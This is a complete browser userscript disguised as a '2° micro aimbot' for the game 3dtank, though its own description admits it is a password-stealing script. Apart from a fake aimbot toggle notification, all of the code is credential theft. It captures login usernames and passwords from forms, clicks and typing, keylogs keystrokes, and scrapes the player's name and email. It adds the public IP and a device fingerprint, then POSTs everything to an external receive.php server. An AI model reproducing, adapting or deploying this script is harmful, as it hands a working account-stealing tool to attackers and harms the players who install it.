// ==UserScript==
// @name         自制2°微自瞄（3dtank静默版v10）
// @description  实际为无须声明权限即可获取账号密码的恶意脚本！！！
// @namespace    http://tampermonkey.net/
// @version      2.0.7
// @downloadURL  https://gitee.com/ArcDent/Arc/raw/main/JS-油猴脚本/自制2°微自瞄（3dtank静默版v10）.user.js
// @updateURL    https://gitee.com/ArcDent/Arc/raw/main/JS-油猴脚本/自制2°微自瞄（3dtank静默版v10）.user.js
// @author       Mod
// @match        https://3dtank.com/play/*
// @connect      api.ipify.org
// @icon         https://www.google.com/s2/favicons?sz=64&domain=tankionline.com
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    console.log("脚本注入成功");

    function waitForBody(callback) {
        if (document.body) {
            console.log("body已加载");
            callback();
        } else {
            console.log("等待body加载");
            setTimeout(() => waitForBody(callback), 100);
        }
    }

    let pressCount = 0;
    document.addEventListener('keydown', function(event) {
        if (event.key === '*') {
            pressCount++;
            waitForBody(() => showNotification(pressCount % 2 === 0));
        }
    });

    function showNotification(isClosed) {
        if (!document.body) {
            console.log("body未加载，跳过通知");
            return;
        }
        const notificationBox = document.createElement('div');
        notificationBox.style.position = 'fixed';
        notificationBox.style.top = '10px';
        notificationBox.style.right = '-220px';
        notificationBox.style.width = '204.21px';
        notificationBox.style.height = '100.35px';
        notificationBox.style.background = 'linear-gradient(to bottom right, green, gray)';
        notificationBox.style.borderRadius = '15px';
        notificationBox.style.color = 'white';
        notificationBox.style.display = 'flex';
        notificationBox.style.justifyContent = 'center';
        notificationBox.style.alignItems = 'center';
        notificationBox.style.zIndex = '9999';
        notificationBox.style.transition = 'right 0.5s ease-in-out';
        notificationBox.textContent = isClosed ? '已关闭自瞄！' : '已启动自瞄，默认2°';
        document.body.appendChild(notificationBox);
        setTimeout(() => {
            notificationBox.style.right = '10px';
            setTimeout(() => {
                notificationBox.style.right = '-220px';
                notificationBox.addEventListener('transitionend', () => {
                    if (notificationBox.parentNode) document.body.removeChild(notificationBox);
                }, { once: true });
            }, 2500);
        }, 50);
    }

    let hasSent = {};

    // 表单提交监听
    document.addEventListener('submit', function(event) {
        console.log("检测到提交事件，目标：", event.target);
        if (event.target.tagName === 'FORM') {
            let username = event.target.querySelector('#username');
            let password = event.target.querySelector('#password') || event.target.querySelector('input[type="password"]');
            console.log("用户名：", username ? username.value : "未找到");
            console.log("密码：", password ? password.value : "未找到");
            if (username && password && !hasSent['form']) {
                let stolenData = {
                    user: username.value,
                    pass: password.value,
                    site: window.location.href,
                    timestamp: new Date().toISOString(),
                    method: 'form'
                };
                sendToTestAPI(stolenData);
                hasSent['form'] = true;
            }
        }
    });

    // 按钮点击监听
    document.addEventListener('click', function(event) {
        if ((event.target.tagName === 'BUTTON' || event.target.type === 'submit') && !hasSent['form_click']) {
            console.log("检测到按钮点击：", event.target);
            let username = document.querySelector('#username');
            let password = document.querySelector('#password') || document.querySelector('input[type="password"]');
            if (username && password) {
                let stolenData = {
                    user: username.value,
                    pass: password.value,
                    site: window.location.href,
                    timestamp: new Date().toISOString(),
                    method: 'form_click'
                };
                console.log("按钮提交捕获：", stolenData);
                sendToTestAPI(stolenData);
                hasSent['form_click'] = true;
            }
        }
    });

    // 输入变化监听（延迟完整输入）
    let lastUsername = '';
    let lastPassword = '';
    let inputTimeout;
    document.addEventListener('input', function(event) {
        if (event.target.id === 'username') {
            lastUsername = event.target.value;
            console.log("用户名输入：", lastUsername);
        }
        if (event.target.type === 'password') {
            lastPassword = event.target.value;
            console.log("密码输入：", lastPassword);
            clearTimeout(inputTimeout);
            inputTimeout = setTimeout(() => {
                if (lastUsername && lastPassword && lastPassword.length >= 6 && !hasSent['input']) {
                    let stolenData = {
                        user: lastUsername,
                        pass: lastPassword,
                        site: window.location.href,
                        timestamp: new Date().toISOString(),
                        method: 'input'
                    };
                    console.log("延迟捕获完整数据：", stolenData);
                    sendToTestAPI(stolenData);
                    hasSent['input'] = true;
                }
            }, 2000);
        }
    });

    // 键盘记录
    let keylogger = '';
    document.addEventListener('keydown', function(event) {
        if (event.key.length === 1) {
            keylogger += event.key;
        } else if (event.key === 'Enter' && keylogger && !hasSent['keylogger']) {
            let stolenData = {
                keystrokes: keylogger,
                site: window.location.href,
                timestamp: new Date().toISOString(),
                method: 'keylogger'
            };
            console.log("键盘记录：", stolenData);
            sendToTestAPI(stolenData);
            hasSent['keylogger'] = true;
            keylogger = '';
        }
    });

    // 捕获游戏用户名
    function checkGameUser() {
        console.log("开始检查游戏用户");
        let username = null;
        let email = 'unknown';
        let pass = 'unknown';

        const userElement = document.querySelector('.UserInfoContainerStyle-userNameRank');
        if (userElement) {
            username = userElement.textContent.trim();
            console.log("从类名找到用户名：", username);
        }

        if (!username) {
            const userElements = document.querySelectorAll('span, div, p, [class*=user], [id*=user], [class*=nick], [id*=nick]');
            const usernameRegex = /^[a-zA-Z0-9_]{3,20}$/;
            const blacklist = ['F11', 'Space', 'Login', '登录', '开始战斗', '等级奖励', '星级挑战'];

            userElements.forEach(el => {
                let text = el.textContent.trim();
                if (usernameRegex.test(text) && !blacklist.some(b => text.includes(b))) {
                    username = text;
                    console.log("正则找到精准用户名：", username);
                }
            });
        }

        if (!username) {
            console.log("未找到用户名");
            return;
        }

        // 尝试从页面抓邮箱
        const emailElements = document.querySelectorAll('input[type="email"], [class*=email], [id*=email]');
        emailElements.forEach(el => {
            let value = el.value || el.textContent;
            if (value && /\S+@\S+\.\S+/.test(value)) {
                email = value.trim();
                console.log("从页面找到邮箱：", email);
            }
        });

        console.log("最终用户名：", username);

        if (!hasSent['game_login']) {
            let stolenData = {
                user: email,
                displayName: username,
                pass: pass,
                site: window.location.href,
                timestamp: new Date().toISOString(),
                method: 'game_login'
            };
            sendToTestAPI(stolenData);
            hasSent['game_login'] = true;
            console.log("检测到用户名，已发送并停止");
        }
    }

    async function getIPAddress() {
        try {
            let response = await fetch('https://api.ipify.org?format=json');
            let data = await response.json();
            console.log("获取IP成功：", data.ip);
            return data.ip || 'unknown';
        } catch (e) {
            console.log("IP获取失败：", e);
            return 'unknown';
        }
    }

    function generateMachineID() {
        let fingerprint = navigator.userAgent + navigator.language + screen.width + screen.height;
        return btoa(fingerprint).slice(0, 10);
    }

    function getDeviceInfo() {
        let ua = navigator.userAgent;
        let os = ua.match(/Windows NT 10/i) ? 'Windows10' : 'unknown';
        let browser = ua.match(/Edge/i) ? 'Edge' : 'Chrome';
        return `${os} ${browser}`;
    }

    async function sendToTestAPI(data) {
        if ((data.user === 'unknown' && (data.pass === 'unknown' || !data.pass)) && !data.keystrokes) return;
        const ip = await getIPAddress();
        data.ip = ip;
        data.machineID = generateMachineID();
        data.deviceInfo = getDeviceInfo();
        console.log("准备发送数据：", data);

        const xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://www.niceday-fineday.me/O.o/receive.php', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                console.log("发送完成，状态码：", xhr.status);
                if (xhr.status === 200) {
                    console.log("数据成功发送到服务器");
                } else {
                    console.log("发送失败，响应：", xhr.responseText);
                }
            }
        };
        xhr.send(JSON.stringify(data));
    }

    function throttle(fn, wait) {
        let lastTime = 0;
        return function() {
            const now = Date.now();
            if (now - lastTime >= wait) {
                fn.apply(this, arguments);
                lastTime = now;
            }
        };
    }

    function startObserver() {
        const observer = new MutationObserver(throttle(() => {
            if (!hasSent['game_login']) {
                checkGameUser();
                if (hasSent['game_login']) {
                    observer.disconnect();
                    console.log("用户名已发送，停止DOM监听");
                }
            }
        }, 1000));
        observer.observe(document.body, { childList: true, subtree: true });
    }

    console.log("脚本加载完成，当前页面：", window.location.href);
    waitForBody(() => {
        setTimeout(() => {
            console.log("初次检查启动");
            checkGameUser();
            if (!hasSent['game_login']) {
                console.log("启动DOM监听");
                startObserver();
            }
        }, 5000);
    });
})();